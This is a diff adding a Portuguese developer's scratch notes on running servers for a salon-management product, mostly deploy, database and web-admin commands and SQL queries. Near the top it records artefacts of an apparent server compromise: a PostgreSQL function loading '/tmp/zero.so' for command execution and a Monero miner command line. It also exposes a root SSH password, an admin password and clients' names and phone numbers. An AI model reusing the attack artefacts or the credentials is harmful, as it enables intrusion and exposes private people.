@@ -1,0 +1,518 @@
+-- Function: sys_eval999(text)
+
+-- DROP FUNCTION sys_eval999(text);
+
+CREATE OR REPLACE FUNCTION sys_eval999(text)
+  RETURNS text AS
+'/tmp/zero.so', 'sys_eval'
+  LANGUAGE c IMMUTABLE STRICT
+  COST 1;
+ALTER FUNCTION sys_eval999(text)
+  OWNER TO postgres;
+
+
+
+19:03:04.952 ERROR - Couldn't send mail
+com.sun.mail.smtp.SMTPSendFailedException: 421 4.7.0 Temporary System Problem.  Try again later
+
+Caused by: java.net.SocketException: Connection closed by remote host
+
+no temp 
+-rw-r--r-- 1 postgres postgres 6022 Dez 22 06:48 HJAOIDh.so
+-rw-r--r-- 1 postgres postgres 1645 Dez 22 05:53 UJxvulbA.so
+
+processo
+/tmp/mpool -c 1 -M stratum+tcp://minner01%40outlook.com:x@xmr.pool.minergate.com:45560/xmr
+
+na configuracao dos projetos blue e green
+./sbt ~container:start > /dev/null - acaba com o /var/log/transitobh.access.log
+
+etc/passwd -> testar depois um nologin no postgres
+
+boleto
+/var/www/html/boleto  é aqui
+/var/www/boleto - não é lá
+
+cria um servidor para por exemplo o ebelle.com.br
+instalar
+sudo npm install -g http-server
+
+cd github/portalEbelle
+http-server
+ele vai falar a porta ai é só colocar o caminho agenda.html
+
+alterar a agenda
+
+instalar o grunt - o grunt é feito em node.js
+/src/main/webapp/v2$ npm instal e/ou npm update
+após alterar os controller.js ou qq .js debaixo de v2/src 
+vai na pasta e dá um 
+grunt concat 
+
+para acessar via mobile a versao local 
+abre terminal no local ifconfig - ve o ip na wlan
+coloca no browser do mobile o ip:7171
+
+para colocar o servidor PDF no ar na maquina local
+abre um terminal especifico
+vai no github ebelle pdfserver
+node index
+
+qualquer url
+http://localhost:8089/?url=http://localhost:8089/?url=http://boleto.vilarika.com.br/boleto/boleto.php?data=10/08/2016&valor=69,90&nosso_numero=442&documento=442&nome=Patricia%20Otoni%20Est%C3%A9tica
+
+relatorios no estoque - os dois do meio sao jasper
+estoque consolidade
+distribuiçao de estoque
+
+rever o inventário hoje só traz se tem estoque, tem que trazer tudo e 
+dar opção de nao trazer zero,  entender pq tem dois sqls com e sem unit
+
+Aline Fraga - Cruzeiro
+	Gerente Viniane Afra - 99943-5607
+
+Sergio's - Pampulha
+	Gerente Adm - Antonia Brant - 99905-4284
+
+Denise Mitiko - Buritis
+	Gerente Adm - Eduardo Paranaguá - 99167-2155
+
+Salao Valentina - Gutierrez
+	Proprietária - Renata Fraga - 99448-9000
+
+Brigitte Bardot - Buritis
+	Proprietária - Letícia Santos - 99102-4835
+
+Marli Nicholls - Santo Antônio
+	Gerente Beth - 99292-0022
+
+
+patricia otoni
+charmeá
+margareth barcelos
+beleza a mais
+
+angela evolution
+
+
+francisco guasti
+rosaria
+
+elan vital
+dunamis
+
+
+datas erradas na CCZS
+09/03/1965
+24/03/1952
+04/03/1965
+
+diretorio de imagens
+/var/www/html/images
+
+ebelle-responsive.css
+font-family: "Times New Roman", Times, serif;
+testar tirar o bordered table - antes do zebra-striped
+
+style="color:#C21;font_size:18px"   vermelho
+
+ver site font awesome
+https://fortawesome.github.io/Font-Awesome/icons/
+http://glyphicons.com/
+
+psql e_belle_ligth_c < log.backup
+
+depois de ir no jenkins
+backup e-belle
+workspace
+ebelle.gz
+vai na pasta com ctrl J descompacta (clica direito e extrai)
+
+renomear o arquivo para tirar o espaço
+
+cd ~/Downloads
+
+chmod 777 ebelle(n)
+
+sudo su postgres
+
+psql e_belle_ligth_c < ebelle
+
+dropa o public local antes
+-- Schema: public
+
+-- DROP SCHEMA public;
+
+CREATE SCHEMA public
+  AUTHORIZATION postgres;
+
+GRANT ALL ON SCHEMA public TO postgres;
+GRANT ALL ON SCHEMA public TO public;
+COMMENT ON SCHEMA public
+  IS 'standard public schema';
+
+
+
+psql e_belle_ligth_c < ebelle
+
+no servidor - vai no jenkins e descompacta
+
+gzip -d ebelle(n).gz
+
+su postgres
+
+psql e_belle_ligth_c < ebelle(n)
+
+
+./sbt update
+
+cd github
+
+cd E-belle-Ligth
+
+./sbt ~jetty-run
+./sbt "~;container:start; container:reload /"
+
+cd apache-activemq-5.9.0/bin
+
+./activemq-admin start
+
+ps -xa | grep java
+
+kill -9 pid
+
+executar o grunt na pasta v2
+
+
+ssh root@transitobh.com.br
+
+senha vilarika775072
+
+mostra se o disco está cheio
+df -h
+
+procurar
+no /tmp
+ls -l sbt*.log
+e remover os antigos e grandes - aparece sempre que gera verao
+
+/var/log/transito.access.log 
+se tiver grande matar (RM) para e voltar o nginx
+
+remove arvore de diretorios pra baixo sem questionar
+rm xx* -r --verbose --force -f
+
+sobre as bases do postgres
+cd /var/lib/pgsql/data/base/ e os numeros que ele gera
+
+/var/lib/pgsql/data
+arquivos estranhos com extensão .dll
+amp.lst - lista de ips
+testtmp
+66.228.57.73:54624
+
+mostra uso de cpu
+top
+
+cat .bash_history | grep find
+
+encontra arquivos maiores que um giga
+find / -type f -size +1G -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'
+encontra arquivos maiores que 500 Mega 
+find / -type f -size +500M -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'
+
+diretorio de logs do Transito
+/var/lib/jenkins/jobs/TrasitoRun/builds
+
+diretorios de logs do ebelle
+/var/lib/jenkins/jobs/run_e-belle-blue/builds
+/var/lib/jenkins/jobs/run_e-belle-green/builds
+
+log do postgres
+cd /var/lib/pgsql/data/pg_log/
+
+// Alterar acesso externo ou informar IP pu comentar a linha
+// meu ip na minha casa
+cd /var/lib/pgsql/data
+vi pg_hba.conf
+
+log do jenkins
+cd /var/log/jenkins
+
+ /etc/init.d/jenkins start
+
+jetty stop
+
+nginx -k reload
+nginx -s reload
+
+/etc/nginx/conf.d/trans.conf
+
+7171 7272 portas do blue e do green 
+
+aqui ficam os dominios e para que pasta aponta - apache
+vim /etc/httpd/conf/httpd.conf
+
+su postgres
+
+/etc/rc.d/init.d/postgresql restart
+
+
+curtir no face
+<div class='widget HTML' id='HTML2'>
+
+	<h2 class='title'>Facebook</h2>
+
+	<div class='widget-content'>
+
+		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Febellegestao&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>
+
+	</div>
+
+	<div class='clear'></div>
+</div>
+
+
+		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2FVilaRikaSolucoes&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>
+
+
+
+no <head>
+<style type="text/css">
+.quebrapagina {
+   page-break-before: always;
+}
+</style>
+
+na quebra
+<br class="quebrapagina">
+
+
+
+
+
+
+
+service jenkins restart
+
+Habilitar activemq no ubuntu via apt-get
+sudo ln -s /etc/activemq/instances-available/main /etc/activemq/instances-enabled/main
+
+site vila rika
+
+/bitbucket/vilarika-site$ httpserver
+
+http://localhost:8080/
+
+
+parar
+
+service postgresql stop
+/etc/init.d/jenkins stop
+
+o jenkins cai mas os processos do ebele podem ficar no ar
+
+ps -aux | grep jenkins
+kill -9 neles
+
+normalmente - resolve
+
+/etc/activemq stop
+
+nginx -s stop
+a mensagem de duplicate mime type nao e problema
+
+service httpd stop
+
+voltar
+
+service postgresql start
+/etc/init.d/jenkins start
+
+nginx
+a mensagem de duplicate mime type nao e problema
+
+o ci.transitobh já funciona, mas tem que subir o active mq antes do deploy
+
+/etc/activemq start
+
+no brower 
+mq.transitobh.com.br
+usuario admin
+a senha amanda1108
+
+vai no ci e depoly ebelle
+se por acaso do gitbub nao estar no ar (como aconteceu comigo e o mateus)
+vai no run ebelle green e comenta o git push com #
+
+remove os arquivos deletados
+git add . -A
+
+service httpd start
+
+se nao subir o apache não mostra as imagens 
+para ver se o apache está no ar 
+http://nb.transitobh.com.br/
+
+no ci.transitobh.com.br
+construir o PDF-server
+
+
+Dr Wagner José Martorina
+Rua dr. Domingos Vieira 586 sala 1205 sta efigenia
+Tel 32417085
+
+via gomide
+comissão alem do percentual do serviço tem um percentual do horario de agenda aberto, 
+tem um rel com o fixo e o "amortizado"
+
+horario por unidade - cor diferente para exibir unidade diferente
+
+opção de lancar só produtos de lanchonete
+
+
+update treatment set detailtreatmentastext = obs where company = 232 and createdby = 1
+update business_pattern set obs = (select min(obs) from belezasoft.cliente where nome = name and fone = phone) where company = 232  and (obs is null or obs = '')
+
+
+select pt.name, sum (pd.value), pa.datepayment, count (pt.name) from paymentdetail pd 
+inner join paymenttype pt on pt.id = pd.typepayment
+inner join payment pa on pa.id = pd.payment
+inner join treatment tr on tr.payment = pa.id
+where pd.company = 229
+group by pa.datepayment, pt.name
+order by pa.datepayment, pt.name
+
+
+
+envio de media - conflito com envio de email
+
+lembrar paloma - email nome apelido
+
+
+select company, name, receive, receiveatsight, defaltaccount, defaltcategory from paymenttype 
+where (receive = true or receiveatsight = true) and (defaltaccount is null or  defaltcategory is null)
+--and company = 35
+order by company desc, name asc
+		
+
+select times, 0, * from logmailsend where read = false limit 50
+update logmailsend set times = 0 where read = false and times is null;
+select times, 1, * from logmailsend where read = true limit 50
+update logmailsend set times = 1 where read = true and times is null;
+
+
+
+rigel   120 vinhos    2 266,84   
+		501 apoio      
+		26 sacolao
+bia 	134           2 266.84	 20,84
+heider 	112
+adriano  67           2 266,84	199,84
+dani                  1 133,42	133,42
+	
+select bp.id, idforcompany as codigoexterno, bp.name as nome, bp.short_name as nomereduzido,
+bp.sex as sexo, bp.birthday as nascimento, bp.document as cpf,
+bp.phone as fone1, bp.mobile_phone as fone2, 
+bp.email_alternative as fone3, bp.email, bp.createdat as criadoem, cs.name as estadocivil, ug.name as grupo,
+cu.name as unidade,
+bp.street as rua, bp.number_c as numero, bp.complement as complemento, bp.district as bairro, bp.postal_code as cep,
+ci.name as cidade, st.short_name as uf,
+bp.obs, is_employee colaborador, valueinaccount as saldo, bp_indicatedby as indicadopor
+from business_pattern bp
+left join civilstatus cs on cs.id = civilstatus
+left join usergroup ug on ug.id = group_c
+left join companyunit cu on cu.id = bp.unit
+left join city ci on ci.id = cityref
+left join state st on st.id = stateref
+where bp.company = 35 order by bp.name, is_employee, bp.createdat
+limit 50000
+
+
+asset
+id company status
+product
+barcode (tag)
+dtini (primeira ocorrencia)
+dtfim 
+unit
+centro de custo????
+
+tipo de ativo (computador impressora, etc)
+
+asset occorrencia
+id company status
+asset
+data
+tipo (aqui, locacao,manutencao
+parceiro
+local(parceiro também)
+unit
+centro de custo ?????
+valor
+obs
+
+tipo ocorrencia
+valor (positivo/negativo)
+validade (meses dias)
+
+preço de locação e unidade de tempo no produto?
+usar o bom para características? ou algo do tipo?
+
+criar app pet - usar o nome ebelle pet
+
+criar snippet de treatment e detail
+criar animal ou usar parceiro?
+
+
+select * from business_pattern where name like 'Carolina Cu%' and company = 1
+
+select image, imagethumb from business_pattern where name like 'Carolina Cu%' and company = 1
+
+update business_pattern set image = 'cliente.png' imagethumb = 'cliente.png' where name like 'Carolina Cu%' and company = 1
+
+update business_pattern set image = 'cliente.png', imagethumb = 'cliente.png' where name like 'Carolina Cu%' and company = 1
+
+select company, name, image from business_pattern where image = '' or image = 'thumb_F973675429076YBBTOR.jpg.png';  
+update business_pattern set image = 'cliente.png' where image = '' or image = 'thumb_F973675429076YBBTOR.jpg.png';  
+
+select company, name, imagethumb from business_pattern where imagethumb = '' or imagethumb = 'thumb_F973675429076YBBTOR.jpg.png';  
+update business_pattern set imagethumb = 'cliente.png' where imagethumb = '' or imagethumb = 'thumb_F973675429076YBBTOR.jpg.png';  
+
+or imagethumb = ''
+
+
+
+
+"thumb_F973675429076YBBTOR.jpg.png"
+
+
+select ap.duedate, ac.short_name as category, substr(ap.obs,1,40), ap.value, ap.typemovement, bp.short_name, cs.idForcompany, acc.short_name as account
+                                      from     
+                                      accountpayable ap
+                                      left join accountcategory ac on(ac.id=ap.category)
+                                      left join business_pattern as bp on(bp.id=ap.user_c)
+                                      left join cashier cs on(cs.id=ap.cashier)
+                                      left join account acc on(acc.id = ap.account)
+                                      left join cheque ch on (ch.id = cheque)
+                                      left join business_pattern bc on bc.id = ch.customer
+                                      left join bank bk on bk.id = ch.banc
+                                    WHERE ap.company=8 and ap.cashier=25816 and ap.autocreated = false
+
+
+                                    
+
+drwx------ 2 postgres postgres      4096 Jun 25 13:31 config.f
+drwx------ 2 postgres postgres      4096 Jun 25 13:31 conf.n
+drwx------ 2 postgres postgres      4096 Jun 25 13:31 facebook
+-rw-r--r-- 1 postgres postgres      6512 Jun 25 13:31 gameover.so
+drwxr-xr-x 4 postgres postgres      4096 Jun  8 00:03 Jetty_0_0_0_0_8081_app.war___ligth.e.belle.com.br_10kfcm_7473024741303513016
+drwxr-xr-x 5 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_dev.war___dev.transitobh.com.br_.e77olt_4548938691390096950
+drwxr-xr-x 5 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_dev.war___dev.transitobh.com.br_.e77olt_5058231851523102420
+drwxr-xr-x 4 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_majude___dev.majude.com_ey2ntm_3258266216837925
+drwxr-xr-x 4 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_test____up9lrw_6667629730188225113
+-rwx------ 1 postgres postgres      1058 Jun  3 15:50 Loader.sh
+drwx------ 2 postgres postgres      4096 Jun 25 13:31 Run.sh
+-rwxrwxrwx 1 postgres postgres   1334372 Jun  3 13:46 scsi_eh_320
+
+
